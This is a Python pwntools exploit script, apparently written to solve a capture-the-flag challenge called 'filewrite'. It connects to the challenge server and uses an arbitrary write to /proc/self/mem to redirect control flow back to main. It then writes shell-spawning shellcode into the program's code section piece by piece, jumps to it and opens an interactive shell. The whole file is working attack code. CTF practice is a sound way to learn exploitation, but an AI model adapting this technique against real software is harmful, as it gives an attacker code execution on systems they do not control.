#! /usr/bin/env python3
from pwn import *
from Crypto.Util.number import long_to_bytes
from Crypto.Util.number import bytes_to_long

context.binary = elf = ELF('./chal')
local = False
GDBSCPT = '''
b *main+471
c

'''
# context.log_level="debug"

if local:
    conn = elf.process()
    gdb.attach(conn, gdbscript=GDBSCPT)
else :
    host = 'filewrite.ctf.ingeniums.club'
    port = 1337
    conn = remote(host,port, ssl=True)

def interactWithBinary(arg1, arg2, arg3):
    conn.recvuntil(b":")
    conn.sendline(arg1)
    
    conn.recvuntil(b":")
    conn.sendline(arg2)
    
    conn.recvuntil(b":")
    conn.sendline(arg3)

def performJMP(hexOffset) :
    addr = main + 471 + 1

    interactWithBinary(
    	b"/proc/self/mem",
    	str(addr).encode(),
    	str(int(hexOffset, 16)).encode()
    )


def writeShellcode() :
    shellAsm = shellcraft.sh()
    shellcode = asm(shellAsm)
    
    log.info(f"shellcode: {shellcode}")
    
    for i in range(0, len(shellcode), 4) :
        addr = main + 502 + 1 + i
        part = shellcode[i:i+4][::-1]
        interactWithBinary(
    	    b"/proc/self/mem",
    	    str(addr).encode(),
	    str(bytes_to_long(part)).encode()
    	)        
    	
main = elf.sym['main']
log.info(f'main @ {hex(main)} {main}')

# jump to main
performJMP(hex(-476 & 0xffffffff))

# write shellcode somewhere in code (main + 502)
writeShellcode()

# jump to the shellcode
performJMP(hex(27))


conn.interactive()
conn.close()
